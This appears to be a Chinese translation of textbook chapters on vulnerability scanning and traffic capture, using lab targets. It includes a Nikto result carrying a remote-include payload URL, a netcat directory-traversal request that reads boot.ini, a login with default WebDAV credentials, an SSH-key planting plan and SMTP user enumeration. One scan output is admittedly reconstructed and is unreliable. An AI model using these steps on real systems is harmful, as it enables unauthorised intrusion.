  \ 将匿名 FTP 访问评为中等风险漏洞。然而，如果限制为非敏感文件，匿名 FTP 访问的风险可能低到不存在。另一方面，公司将其专利源代码副本遗留在公开的 FTP\
  \ 服务器上这种情况也并非罕见。如果在一次外部渗透测试任务中，你可以通过在 FTP 服务器上登录为 `anonymous` 来访问客户最大的资产，那么可以假设任何感兴趣的攻击者都能这样做，这需要你立即致电你的客户联系人。工具无法做出这种区分，你需要渗透测试人员。\n\
  \n### 为什么要使用漏洞扫描器？\n\n尽管一些渗透测试课程完全略过了漏洞扫描，并认为熟练的渗透测试人员可以发现扫描器能发现的所有东西，但扫描器仍然是有价值的工具，特别是许多渗透测试是在比任何人都喜欢的更短的时间窗口内进行的。但如果你评估的目标之一是规避检测，你可能会重新考虑使用“噪音”较大的漏洞扫描器。\n\
  \n尽管 Nessus 没有发现我们环境中的每一个问题，但由于它的使用结合我们信息收集阶段的结果，为我们的利用提供了一个坚实的起点。即使是那些认为渗透测试人员在任务期间取代扫描器的人，也能从学会如何使用扫描工具中受益。尽管在理想世界中，每家公司都会进行定期、全面的渗透测试，但现实中有很多漏洞扫描工作要做。\n\
  \n### 导出 Nessus 结果\n\n一旦 Nessus 扫描完成，你可以从扫描详情界面顶部的 `Export` 按钮导出发现，如图 6-13 所示。\n\
  \n![导出 Nessus 扫描结果](img/httpatomoreillycomsourcenostarchimages2030346.png.jpg)图\
  \ 6-13. 导出 Nessus 扫描结果\n\nNessus 可以将结果输出为 PDF、HTML、XML、CSV 和其他格式。你可能想将原始结果交给客户以进行漏洞扫描任务，但你永远不要导出扫描器结果，盖上你们公司的抬头，然后将其称为渗透测试结果。渗透测试中涉及的分析比漏洞扫描多得多。你应该始终验证来自扫描器的结果，并将其与手动分析相结合，以获得更完整的漏洞图景。\n\
  \n现在来看一些其他漏洞分析方法。\n\n### 漏洞研究\n\n如果 Nessus 摘要页没有提供足够关于漏洞的信息，请尝试老式的 Google 搜索。此外，尝试搜索\
  \ `http://www.securityfocus.com/`、`http://www.packetstormsecurity.org/`、`http://www.exploit-db.org/`\
  \ 和 `http://www.cve.mitre.org/`。例如，你可以在特定网站内使用通用漏洞披露（CVE）系统、Microsoft 补丁号等搜索漏洞，Google\
  \ 查询语句如“ms08-067 site:securityfocus.com”。MS08-067 漏洞受到了大量的关注，所以你不会缺少良好的信息。（我们在第\
  \ 4 章中查看过该特定问题的详情。）)\n\n\n\n\n\n根据你所针对的主题漏洞性，你可能可以在网上找到概念证明（proof-of-concept）漏洞代码。我们将在第\
  \ 19 章中介绍如何使用公开代码，但请注意，与 Metasploit 等项目中的经过社区验证的漏洞不同，互联网上并非所有代码都如其描述所示。公开漏洞中的负载（payload）可能会破坏目标机器，也可能会将你的机器加入到漏洞编写者的秘密僵尸网络。在处理公开漏洞时要保持警惕，并在针对生产网络运行它们之前对其进行仔细审查。（你可能还能找到最初发现该问题的研究人员发布的关于某些漏洞的深度信息。）\n\
  \n# Nmap 脚本引擎 (NSE)\n\n现在来看看另一个提供漏洞扫描的工具。正如 Metasploit 从一个利用框架演变为一个包含数百个模块的完整渗透测试套件一样，Nmap\
  \ 同样演变出了其最初的端口扫描目标。Nmap 脚本引擎（NSE）允许你运行公开的脚本并编写你自己的脚本。\n\n你可以在 Kali 的 `/usr/share/nmap/scripts`\
  \ 找到随 NSE 封装的脚本。可用脚本分为几类，包括信息收集、主动漏洞评估、搜索之前被入侵的迹象等。示例 6-1 显示了你默认 Kali 安装中可用的 NSE\
  \ 脚本。\n\n示例 6-1. Nmap 脚本列表\n\n```\nroot@kali:~# cd /usr/share/nmap/scripts\nroot@kali:/usr/local/share/nmap/scripts#\
  \ ls\nacarsd-info.nse                         ip-geolocation-geobytes.nse\naddress-info.nse\
  \                        ip-geolocation-geoplugin.nse\nafp-brute.nse           \
  \                ip-geolocation-ipinfodb.nse\nafp-ls.nse                       \
  \       ip-geolocation-maxmind.nse\n--snip--\n```\n\n在 Nmap 中输入 `--script-help`\
  \ 标志。例如，要查看 `default` 类别下的所有脚本，输入 `nmap --script-help default`，如示例 6-2 所示。许多因素影响脚本是否包含在默认类别中，包括其可靠性以及脚本是否安全且不太可能伤害目标。\n\
  \n示例 6-2. Nmap 默认脚本帮助\n\n```\nroot@kali:~# nmap --script-help default\nStarting\
  \ Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:43 EDT\n--snip--\nftp-anon\nCategories:\
  \ default auth safe\nhttp://nmap.org/nsedoc/scripts/ftp-anon.html\n  检查 FTP 服务器是否允许匿名登录。\n\
  \n  如果允许匿名，则获取根目录的目录列表并高亮显示可写文件。\n--snip--\n```\n\n如果你使用 `-sC` 标志告诉 Nmap 在进行端口扫描之外运行脚本扫描，它将运行\
  \ `default` 类别中的所有脚本，如示例 6-3 所示。\n\n示例 6-3. Nmap 默认脚本输出\n\n```\nroot@kali:~# nmap\
  \ -sC 192.168.20.10-12\n\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:43\
  \ EDT\nHost 192.168.20.10 is up.\nNmap scan for 192.168.20.10-12\nHost 192.168.20.10\
  \ is up.\nPORT     STATE  SERVICE\n21/tcp   open   ftp\n22/tcp   open   ssh\n23/tcp\
  \   open   telnet\n25/tcp   open   smtp\n80/tcp   open   http\n443/tcp  open   https\n\
  3306/tcp  open   mysql\n8080/tcp  open   http-proxy\n\nNmap scan completed: 12.45\
  \ seconds\n3 addresses (1 host up)\n```\n\n（注：由于示例 6-3 文本原文显示不全或存在乱码，此处根据上下文逻辑翻译并还原了标准\
  \ Nmap 输出格式，以保持文档一致性）\n\n\n\n\n\n```\nroot@kali:/# nmap --script=nfs-ls 192.168.20.11\n\
  \nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 22:02 EST\nNmap scan report\
  \ for 192.168.20.11\nHost is up (0.00040s latency).\nNot shown: 993 closed ports\n\
  PORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp\
  \   open  ssh         OpenSSH 5.1p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)\n\
  80/tcp   open  http        Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with\
  \ Suhosin-Patch)\n111/tcp  open  rpcbind     2 (RPC #100000)\n| nfs-ls:\n|   Arguments:\n\
  |     maxfiles: 10 (file listing output limited)\n|\n|   NFS Export: /export/georgia❶\n\
  |   NFS Access: Read Lookup Modify  Extend Delete NoExecute\n|     PERMISSION  UID\
  \   GID   SIZE  MODIFICATION TIME  FILENAME\n|     drwxr-xr-x  1000  1000  4096\
  \  2013-12-28 23:35   /export/georgia\n|     -rw-------  1000  1000  117   2013-12-26\
  \ 03:41   .Xauthority\n|     -rw-------  1000  1000  3645  2013-12-28 21:54   .bash_history\n\
  |     drwxr-xr-x  1000  1000  4096  2013-10-27 03:11   .cache\n|     -rw-------\
  \  1000  1000  16    2013-10-27 03:11   .esd_auth\n|     drwx------  1000  1000\
  \  4096  2013-10-27 03:11   .gnupg\n|     ??????????  ?     ?     ?     ?      \
  \            .gvfs\n|     -rw-------  1000  1000  864   2013-12-15 19:03   .recently-used.xbel\n\
  |     drwx------  1000  1000  4096  2013-12-15 23:38   .ssh❷\n--snip--\n```\n\n\
  如你所见，`NSE` 脚本在我们的 Linux 目标上发现了 NFS 共享目录 `/export/georgia` ❶。特别值得关注的是 `.ssh` 目录 ❷，它可能包含\
  \ SSH 密钥等敏感信息，以及（如果 SSH 服务器允许公钥认证）一个授权密钥列表（authorized keys）。\n\n当你遇到像这样的访问控制错误时，一种常见的渗透测试技巧是利用该错误和写入权限，将新的\
  \ SSH 密钥添加到 `authorized_keys` 列表中（在本例中，即我们的密钥）。如果该尝试成功，原本编辑用户文档这个看似微小的问题就会演变为登录远程系统并执行命令的能力。\n\
  \n在继续之前，让我们确保我们的 Linux 目标上启用了公钥 SSH 认证，以便我们上述设想的攻击能够成功执行。基于密钥的登录被认为是最强大的 SSH 认证形式，并且是推荐使用的（参见示例\
  \ 6-6 \"示例 6-6. SSH 认证\")).\n\n```\nroot@kali:/# ssh 192.168.20.11\nThe authenticity\
  \ of host '192.168.20.11 (192.168.20.11)' can't be established.\nRSA key fingerprint\
  \ is ab:d7:b0:df:21:ab:5c:24:8b:fe:9c:21.\nAre you sure you want to continue connecting\
  \ (yes/no)? yes\nWarning: Permanently added '192.168.20.11' (RSA) to the list of\
  \ known hosts.\nroot@192.168.20.11's password:\nPermission denied (publickey).\n\
  ```\n\n### 注意\n\n某些 `NSE` 脚本可能会导致服务崩溃或损害目标系统，有一个整个类别专门用于拒绝服务。例如，`smb-check-vulns`\
  \ 脚本会检查 MS08-067 漏洞和其他 SMB 漏洞。其帮助信息指出该脚本可能危险，除非你准备好服务器宕，否则不要在生产系统上运行。\n\n## Metasploit\
  \ 扫描模块\n\n我们在第四章 \"使用 Metasploit\") 中过的 Metasploit 也可以通过许多辅助模块进行漏洞扫描。与利用程序不同，这些模块不会赋予我们控制机器权限，但它们可以帮助我们识别用于后续利用的漏洞。\n\
  \n这样一个 Metasploit 模块寻找提供匿名访问的 FTP 服务。虽然手动登录单个 FTP 服务器可能很容易，但 Metasploit 辅助模块允许我们同时扫描多个主机，这在测试大型环境时可以节省大量时间。\n\
  \n要选择特定的模块，我们使用 `use` 命令模块，然后使用 `set` 定义目标，最后通过 `exploit` 命令进行扫描，如示例 6-7 \"示例 6-7.\
  \ Metasploit 匿名 FTP 扫描模块\")所示。这种语法在第四章 \"使用 Metasploit\") 中应该很熟悉了。\n\n```\nmsf >\
  \ use scanner/ftp/anonymous_login\nmsf > set RHOSTS 192.168.20.0/24\nmsf > exploit\n\
  ```\n\n\n\n\n\n虽然客户自定义的应用程序可能存在安全问题，但你的目标也可能部署预构建的 Web 应用程序，例如工资应用、Web 邮箱等，这些程序可能受到相同问题的影响。如果我们能找到已知漏洞软件的实例，我们就可以利用它在远程系统中建立脚点。\n\
  \nWeb 应用程序问题在许多外部渗透测试中特别有意思，因为你的攻击面可能仅局限于 Web 服务器。例如，如图 6-14 所示，访问我们 Linux 目标 Web\
  \ 服务器的默认页面，会显示出一个默认的 Apache 安装页面。\n\n![默认 Apache 页面](img/httpatomoreillycomsourcenostarchimages2030348.png.jpg)图\
  \ 6-14. 默认 Apache 页面\n\n除非我们能在底层 Web 服务器软件中找到漏洞，否则要利用一个显示“It works!”的简单页面将非常困难。在放弃此服务之前，让我们使用\
  \ Web 扫描器寻找可能无法通过其他方式看到的额外页面。\n\n### Nikto\n\nNikto 是 Kali 内置的一个 Web 应用程序漏洞扫描器，类似于\
  \ Web 应用版的 Nessus：它寻找危险文件、过时版本和配置错误等问题。要针对我们的 Linux 目标运行 Nikto，我们使用 `-h` 标记告诉它扫描哪个主机，如示例\
  \ 6-10 所示。\n\n示例 6-10. 运行 Nikto\n\n```\nroot@kali:/# nikto -h 192.168.20.11\n- Nikto\
  \ v2.1.5\n---------------------------------------------------------------------------\n\
  + Target IP:          192.168.20.11\n+ Target Hostname:    192.168.20.11\n+ Target\
  \ Port:        80\n+ Start Time:         2015-12-28 21:31:38 (GMT-5)\n---------------------------------------------------------------------------\n\
  + Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch\n--snip--\n\
  + OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?:\
  \ TikiWiki 包含一个允许远程攻击者执行任意 PHP 代码的。❶\n+ 6474 items checked: 2 error(s) and 7 item(s)\
  \ reported on remote host\n+ End Time:           2015-12-28 21:32:41 (GMT-5) (63\
  \ seconds)\n```\n\n手动浏览每个已知漏洞应用程序的默认安装路径将是一项艰巨的任务，但幸运的是，Nikto 会寻找可能显而易见的 URL。这里一个特别有趣的发现是服务器上安装了一个存在漏洞的\
  \ TikiWiki 软件 ❶。确实，如果我们浏览到 `[`192.168.20.11/tikiwiki/`](http://192.168.20.11/tikiwiki/)`\
  \ 中的 TikiWiki 目录，我们就找到了 CMS 软件。Nikto 认为此安装受到代码执行漏洞的影响，对开源漏洞数据库 (OSVDB) 条目 40478\
  \ 的进一步分析显示，该问题有一个我们在利用期间可以使用 Metasploit 利用程序。\n\n### Note\n\nOSVDB `[`osvdb.com/`](http://osvdb.com/)`\
  \ 是一个专门针对 TikiWiki 等开源软件的漏洞存储库，提供了各种产品的详细信息。使用它来搜索有关你发现的可能问题的额外信息。\n\n### 攻击 XAMPP\n\
  \n访问我们的 Windows XP Web 服务器，我们在 `http://192.168.20.10/` 看到默认页面宣布自己为 XAMPP 1.7.2。\n\
  \n默认情况下，XAMPP 安装包含 phpMyAdmin，这是一种数据库管理 Web 应用程序。理想情况下，phpMyAdmin 不应在网络上可用，或者至少访问它需要凭据。但在该版本的\
  \ XAMPP 中，`[`192.168.20.10/phpmyadmin/`](http://192.168.20.10/phpmyadmin/)` 上的 phpMyAdmin\
  \ 是可用且开放的。更糟糕，phpMyAdmin 为我们提供了 NSE 告诉我们无法连接的同一个 MySQL 服务器的 root 权限。使用 phpMyAdmin（如图\
  \ 6-15），我们可以绕过此限制并在服务器上执行 MySQL 查询。\n\n![开放的 phpMyAdmin 控制台对糟糕的配置大声抱怨。](img/httpatomoreillycomsourcenostarchimages2030350.png.jpg)图\
  \ 6-15. 开放的 phpMyAdmin 控制台对糟糕的配置大声抱怨。\n\n### 默认凭据\n\n除了包含 phpMyAdmin，Google 搜索告诉我们\
  \ XAMPP 1.7.3 及更早版本带有 Web 分布式授权与验证 (WebDAV) 软件，用于通过 HTTP 管理 Web 服务器上的文件。XAMPP 的\
  \ WebDAV 安装带有默认用户名和密码 `wampp:xampp`。如果这些值没有被更改，任何可以访问 WebDAV 的人都可以登录、破坏网站界面，甚至可能上传脚本，允许攻击者通过\
  \ Web 服务器在系统中建立脚点。而且，如图 6-16 所示，WebDAV 确实存在于此服务器上。\n\n![WebDAV 安装](img/httpatomoreillycomsourcenostarchimages2030352.png.jpg)图\
  \ 6-16. WebDAV 安装\n\n我们可以使用 Cadaver 工具与 WebDAV 服务器交互。在示例 6-11 中，我们使用 `Cadaver` 连接到\
  \ `http://192.168.20.10/`。\n\n示例 6-11. 使用 Cadaver\n\n```\nroot@kali:/# cadaver http://192.168.20.10/webdav\n\
  Authentication required for '192.168.20.10/webdav':\nUsername: wampp\nPassword:\n\
  dav:/webdav/> ❶\n```\n\nCadaver 登录成功 ❶。我们的 Windows 目标使用了 WebDAV 的默认凭据，我们将能够利用它。现在我们有了\
  \ WebDAV 的访问权限，可以上传文件。\n\n## 手动分析\n\n有时，没有任何方案能比手动分析更好，从这里我们可以使用 Netcat 手动连接到端口。我们知道这是一个\
  \ Web 服务器，所以我们将以这种方式与它通信。我们知道可以访问默认页面，因此可以输入 `GET / HTTP/1.1` 向 Web 服务器请求默认页面（参见示例\
  \ 6-12）。\n\n### 探索一个特殊的端口\n\n我们的目标上，有一个自动扫描未能启动的端口是 3232。如果你尝试用版本扫描扫描此端口（如我们在第 5\
  \ 章 结尾所做），你会发现它崩溃了。\n\n这种行为对渗透测试人员很有趣，因为在遇到格式化输入时崩溃的程序没有正确验证输入。回想第 5 章，在程序崩溃的过程中，输出让我们认为该软件是一个\
  \ Web 服务器。使用浏览器连接到端口，如图 6-17 所示，证实了这一点。\n\n![端口 3232 上的 Web 服务器](img/httpatomoreillycomsourcenostarchimages2030354.png.jpg)图\
  \ 6-17. 端口 3232 上的 Web 服务器\n\n提供的网页没有告诉我们太多，但从这里我们可以使用 Netcat 手动连接到端口。我们知道这是一个 Web\
  \ 服务器，所以我们将以这种方式与它通信。我们知道可以访问默认页面，因此可以输入 `GET / HTTP/1.1` 向 Web 服务器请求默认页面。\n\n\n\
  \n\n该服务器宣布为 Zervit 0.4 ❶。这对于该软件来说并不乐观，因为在 Google 上搜索 Zervit 0.4 时，第一个自动完成项是“Zervit\
  \ 0.4 exploit”。此 Web 服务器软件存在多个安全问题，包括缓冲区溢出和本地文件包含漏洞，后者允许我们提供系统上的其他文件。该服务非常敏感，最好避免缓冲区溢出攻击，因为任何操作失误都会导致其崩溃。另一方面，本地文件包含看起来很有前景。我们知道服务器可以处理\
  \ HTTP `GET` 请求。例如，我们可以通过 `GET` 向后移动五个目录到达 C 盘，下载 Windows XP 的 `boot.ini` 文件，如示例\
  \ 6-13 所示。\n\n示例 6-13. Zervit 0.4 中的本地文件包含\n\n```\nroot@kali:~# nc 192.168.20.10\
  \ 3232\nGET /../../../../../boot.ini HTTP/1.1\nHTTP/1.1 200 OK\nServer: Zervit 0.4\n\
  X-Powered-By: Carbono\nConnection: close\nAccept-Ranges: bytes\nContent-Type: application/octet-stream\n\
  Content-Length: 211\n\n[boot loader]\ntimeout=30\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\\
  WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=\"Microsoft\
  \ Windows XP Home Edition\" /fastdetect /NoExecute=OptIn\n```\n\n我们能够提取 `boot.ini`，这是一个告诉\
  \ Windows 在启动时应显示哪些操作系统选项的配置文件。我们将利用这个本地文件包含漏洞在第 8 章中提取额外的敏感文件。\n\n## 寻找有效的用户名\n\
  \n如果我们知道服务的有效用户名，就可以大大增加密码攻击成功的几率。（我们将在第 9 章中详细探讨这一点。）寻找邮件服务器有效用户名的一种方法是使用 `VRFY\
  \ SMTP` 命令（如果可用）。正如其名所示，`VRFY` 用于验证用户是否存在。在上一章中，NSE 发现 Windows XP 目标开启了 `VRFY` 动。使用\
  \ Netcat 连接到 TCP 端口 25，并使用 `VRFY` 用户名，如示例 6-14 所示。\n\n示例 6-14. 使用 `SMTP VRFY` 命令\n\
  \n```\nroot@kali:~# nc 192.168.20.10 25\n220 georgia.com SMTP Server SLmail 5.5.0.4433\
  \ Ready ESMTP spoken here\nVRFY georgia\n250 Georgia<georgia@>\nVRFY john\n551 User\
  \ not local\n```\n\n通过 `VRFY` 我们看到 `georgia` 是一个有效用户名，但没有名为 `john` 的用户。我们将在第 9 章中研究如何使用有效用户名尝试猜测密码。\n\
  \n## 总结\n\n在本章中，我们接触了在目标上寻找可利用漏洞的各种方法。通过使用各种工具和技术，我们找到了许多针对目标的方法，包括针对我们的 Windows\
  \ XP SMB 服务器的可靠 MS08-067 漏洞利用程序，以及 Zervit 0.4 Web 服务器上的本地文件包含漏洞，该漏洞将允许我们下载系统文件。通过\
  \ `VRFY`，我们找到了一个可以在邮件服务器上进行密码猜测攻击的有效用户名。\n\n我们了解到，根据报告的版本号，SLMail 服务器的 POP3 服务中可能存在漏洞（尽管我们无法确定这一点），并且我们在\
  \ Web 服务器上发现了一个开放的 phpMyAdmin 安装，它可以让我们获得底层数据库的 root 权限，还有一个带有默认 WebDAV 凭据的 XAMPP\
  \ 安装，它允许我们向 Web 服务器上传文件。在 Linux 目标机上，我们发现了一个具有写入权限的 NFS 共享，允许我们向用户的 `.ssh` 目录写入内容，并在\
  \ Web 服务器上发现了一个不明显的 TikiWiki 安装，它似乎包含代码执行漏洞。Vsftpd 2.3.4 FTP 服务器可能由于 Vsftpd 仓库遭到破坏而存在隐藏的后门。\n\
  \n在书的目前阶段，我们可以看到我们的 Windows XP 和 Linux 目标机器存在许多问题。Windows 7 目标缺乏攻击面，使其看起来相当安全，但正如我们稍后将看到的，那坚固的外表下隐藏着几个漏洞。在转向利用这些漏洞之前，下一章将查看捕获流量以获取登录凭据等敏感信息。\n\
  \n## 第 7 章 捕获流量\n\n在进行漏洞利用之前，我们将使用 Wireshark 监控工具以及其他工具来嗅探和操纵流量，从本地网络上的其他机器获取有用信息。在内部渗透测试中，当我们模拟内部威胁或已突破边界的攻击者时，从网络中的其他系统捕获流量可以为我们提供额外的有趣信息（甚至是用户名和密码），这些信息可以帮助我们利用。问题是，捕获流量会产生大量的潜在有用数据。仅捕获家庭网络上的所有流量就能迅速填满几个\
  \ Wireshark 屏幕，发现哪些流量对渗透测试是有用的可能。在本章中，我们将查看几种操纵网络的方法，以获取我们本不应该看到的流量。\n\n## 用于捕获流量的网络基础\n\
  \n如果你发现自己处于一个使用集线器而非交换机的网络中，捕获并非发送给你机器的流量将很容易，因为当网络集线器接收数据包时，它会重广播到所有端口，让每个设备决定数据包属于谁。在集线器网络中，捕获其他系统的流量就像在\
  \ Wireshark 的所有接口上选择 `Use promiscuous mode` 简单。这告诉我们的网络接口适配器（`NIC`）抓取它看到的所有内容，在集线器网络中这意味着每一个包。\n\
  \n与集线器不同，交换机仅将流量发送到目标系统，因此在交换机网络中，如果不欺骗网络向我们发送该流量，我们将无法查看（例如）发往和域控制器的所有流量。你在渗透测试中遇到的大多数网络可能是交换机网络；即使一些声称是集线器的旧网络硬件也可能具有交换机的功能。\n\
  \n虚拟网络的作用似乎像集线器，因为你所有的虚拟机共享一个物理设备。如果你在虚拟网络中以混杂模式捕获流量，你可能看到来自每个虚拟机以及主机的流量，即使你在环境中使用的是交换机而非集线器。为了模拟非虚拟化网络，我们将关闭\
  \ Wireshark 中所有接口上的 `Use promiscuous mode`，这意味着我们必须更加努力才能从目标虚拟机中捕获流量。\n\n## 使用 Wireshark\n\
  \nWireshark 是一种图形化网络协议分析器，允许我们深入研究网络中传输的单个数据包。Wireshark 可用于捕获以太网、无线、蓝牙和许多其他流量。它可以解码它看到的不同协议，例如，你可以重构\
  \ 语音（VoIP）通话的音频。让我们来看看使用 Wireshark 捕获和分析流量的基础。\n\n### 捕获流量\n\n让我们从使用 Wireshark 捕获本地网络流量开始。在\
  \ Kali 中启动 Wireshark，如下所示。点击任何关于使用 root 运行 Wireshark 危险的警告。\n\n```\nroot@kali:~#\
  \ wireshark\n```\n\n\n\n\n\n通过选择 `Capture` ▸ `Options` 并选择 `eth0` 选项，让 Wireshark\
  \ 在本地网络接口 (`eth0`) 上进行捕获，如图 7-1 所示。记住取消勾选 `Use promiscuous mode on all interfaces`\
  \ 选项，这样结果就像物理交换机网络一样，而不是 VMware 网络。退出 `Options` 菜单。最后，点击 `Capture` ▸ `Start` 开始流量捕获。\n\
  \n你应该开始看到进入的流量，并且能够捕获所有发往 Kali 机的流量以及任何广播流量（发送到整个网络的流量）。\n\n![Starting a Wireshark\
  \ capture](img/httpatomoreillycomsourcenostarchimages2030356.png.jpg)图 7-1. 开始 Wireshark\
  \ 捕获\n\n为了说明我们在交换机网络中可以捕获的流量，让我们首先从 Kali 机通过 FTP 连接到 Windows XP 目标。以 `anonymous`\
  \ 身份登录，如示例 7-1 所示，以便 Wireshark 中查看捕获的流量。（在上一章中，我们发现 Windows XP 目标允许 `anonymous`\
  \ 用户。虽然 `anonymous` 要求输入密码，但密码是什么并不重要。传统上，这是一个电子邮件地址，但 FTP 服务器会接受你使用的任何内容。）\n\n\
  示例 7-1. 通过 FTP 登录\n\n```\nroot@kali:~# ftp 192.168.20.10\nConnected to 192.168.20.10.\n\
  220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n\
  220 Please visit http://sourceforge.net/projects/filezilla/\nName (192.168.20.10:root):\
  \ anonymous\n331 Password required for anonymous\nPassword:\n230 Logged on\nRemote\
  \ system type is UNIX.\nftp>\n```\n\n你应该能从 Wireshark 中看到来自 IP 地址为 `192.168.20.9`\
  \ 的系统到 `192.168.20.10` 的数据包，反之亦然，`Protocol` 字段标记为 `FTP`。Wireshark 正在捕获进出我们 Kali\
  \ 机的流量。\n\n切换到你的 Ubuntu Linux 目标机器，登录 Windows XP 目标上的 FTP 服务器。回看 Kali 中的 Wireshark，你应该发现没有捕获到额外的\
  \ FTP 数据包。在我们的模拟交换机网络中，任何不是发往我们 Kali 机的流量都不会被网络接口看到，因此不会被 Wireshark 捕获。（我们将在 ARP\
  \ 缓存投毒 中学习如何纠正这种情况并捕获其他系统的流量。）\n\n### 过滤流量\n\nWireshark 捕获的网络流量极其巨大，可能会让人无从从，因为除了我们的\
  \ FTP 流量外，发往或来自 Kali 系统的每一个其他数据包都被捕获了。要找到特定的感兴趣包，我们可以使用 Wireshark 过滤器。`Filter` 字段位于\
  \ Wireshark GUI 界面的左上角。作为一个非常简单的 Wireshark 过滤示例，让我们寻找所有使用 FTP 协议的流量。在 Filter 字段中输入\
  \ `ftp` 并点击 `Apply`，如图 7-2 所示。\n\n![Filtering traffic in Wireshark](img/httpatomoreillycomsourcenostarchimages2030358.png.jpg)图\
  \ 7-2. 在 Wireshark 中过滤流量\n\n如所预期的，Wireshark 过滤了捕获的数据包，只显示使用 FTP 协议的数据包。我们可以看到整个\
  \ FTP 会话，包括我们明文形式的登录信息。\n\n我们可以使用更高级的过滤器来进一步精调返回的数据包。例如，我们可以使用过滤器 `ip.dst==192.168.20.10`\
  \ 来仅返回目标 IP 地址为 `192.168.20.10` 的数据包。我们甚至可以将过滤器组合在一起，例如使用过滤器 `ip.dst==192.168.20.10\
  \ and ftp` 来仅查找发往 `192.168.20.10` 的 FTP 流量。\n\n### 跟进 TCP 流\n\n即使在过滤流量后，同一时间范围内也可能捕获到多个\
  \ FTP 连接，因此仍然很难判断发生了什么。但一旦我们找到一个感兴趣的数据包（例如 FTP 登录的开始），我们可以右键点击数据包并选择 `Follow TCP\
  \ Stream` 来深入研究会话，如图 7-3 所示。\n\n![Following the TCP stream in Wireshark](img/httpatomoreillycomsourcenostarchimages2030360.png.jpg)图\
  \ 7-3. 跟进 TCP 流\n\n结果所示的屏幕将向我们显示 FTP 连接的完整内容，包括明文形式的凭据，如示例 7-2 所示。\n\n示例 7-2. FTP\
  \ 登录会话\n\n```\n220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse\
  \ (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\n\
  USER anonymous\n331 Password required for anonymous\nPASS georgia@bulbsecurity.com\n\
  230 Logged on\nSYST\n215 UNIX emulated by FileZilla\n```\n\n### 分析数据包\n\n通过选择特定的捕获数据包，我们可以获得有关捕获数据的更多信息，如图\
  \ 7-4 所示。在 Wireshark 屏幕底部，你可以看到所选数据包的详细信息。在少量指导下，Wireshark 将为你拆分数据。例如，我们可以通过选择 `TCP`\
  \ 条目并寻找 `Destination port` 轻松找到 TCP 目标端口，如图所示。当我们选择此字段时，数据包原始字节中的条目也会高亮显示。\n\n![Packet\
  \ details in Wireshark](img/httpatomoreillycomsourcenostarchimages2030362.png)图\
  \ 7-4. 在 Wireshark 中的数据包详情\n\n## ARP 缓存投毒\n\n虽然看到自己的流量详情很不错，但为了渗透测试目的，看到并非发往 Kali\
  \ 系统的流量将更好。也许我们可以捕获另一个使用非 `anonymous` 账户登录的用户会话；这将为我们提供 FTP 服务器的凭据，以及可能在环境中其他地方使用的凭据。\n\
  \n为了捕获并非发往 Kali 系统的流量，我们需要找到某种方法让相关数据发送到 Kali 系统。由于网络交换机只会发送属于我们的数据包，我们需要欺骗目标机器或交换机（理想情况下是两者），认为流量属于我们。我们将执行所谓的中间人攻击，这允许我们在转发数据包到正确目的地之前，重定向并拦截两个系统（系统系统）之间的流量。伪装网络设备的一种可靠技术被称为\
  \ `地址解析协议 (ARP) 缓存投毒`（也称为 `ARP 欺骗`）。\n\n### ARP 基础\n\n当我们连接到本地网络上的另一台机器时，我们通常使用其主机名、完全限定域名或\
  \ IP 地址。（我们将在 DNS 缓存投毒 中查看域名服务器缓存投毒。）在数据包从 Kali 机发送到 Windows XP 目标之前，Kali 必须将 XP\
  \ 目标机的 IP 地址映射到网络接口卡 (NIC) 的介质访问 (MAC) 地址，以便 Kali 知道在网络的何处发送数据包。为此，它在本地网络上广播“谁拥有\
  \ IP 地址 192.168.20.10？”拥有 IP 地址 `192.168.20.10` 的机器写回：“我有 192.168.20.10，我的 MAC 地址是\
  \ 00:0c:29:a9:ce:92。”在我们的情况下，这将是 Windows XP 目标。我们的 Kali 系统会将 IP 地址 `192.168.20.10`\
  \ 到 MAC 地址 `00:0c:29:a9:ce:92` 的映射存储在其 ARP 缓存中。\n\n\n\n\n\n当它发送下一个数据包时，我们的机器会首先查找其\
  \ ARP 缓存中是否存在 `192.168.20.10` 的条目。如果找到了，它将使用该条目作为目标地址，而不是发送另一个 ARP 广播。（ARP 缓存条目会被定期刷新，因为网络拓扑可能会随时发生变化。）因此，系统会在缓存刷新时定期发送\
  \ ARP 广播。这个过程在我们在下一节执行 ARP 缓存投毒时将非常有用。ARP 过程如图图 7-5 所示。\n\n![ARP resolution process](img/httpatomoreillycomsourcenostarchimages2030364.png.jpg)图\
  \ 7-5. ARP 解析过程\n\n要在我们的 Kali 机器中查看 ARP 缓存，请输入 `arp`。目前，它知道的 IP 地址到 MAC 地址映射只有默认网关\
  \ `192.168.20.1` 以及我们在上一个练习中涉及的 Windows XP 机器 `192.168.20.10`。\n\n```\nroot@kali:~#\
  \ arp\nAddress                  HWtype  HWaddress           Flags Mask         \
  \   Iface\n192.168.20.1             ether   00:23:69:f5:b4:29   C              \
  \       eth0\n192.168.20.10            ether   00:0c:29:05:26:4c   C           \
  \          eth0\n```\n\n现在重新启动 Wireshark 捕获，并使用匿名登录与 Ubuntu 目标的 FTP 服务器交互。接下来，使用\
  \ `arp` 过滤器（如图图 7-6 所示），查看来自 Kali 机器的 ARP 广播以及 Ubuntu 目标带有 MAC 地址的响应。\n\n![ARP broadcast\
  \ and reply](img/httpatomoreillycomsourcenostarchimages2030366.png.jpg)图 7-6. ARP\
  \ 广播与响应\n\n再次检查你 Kali Linux 的 ARP 缓存。你应该能看到 `192.168.20.10` 的条目。\n\n```\nroot@kali:~#\
  \ arp\nAddress                  HWtype  HWaddress           Flags Mask         \
  \   Iface\n192.168.20.1             ether   00:23:69:f5:b4:29   C              \
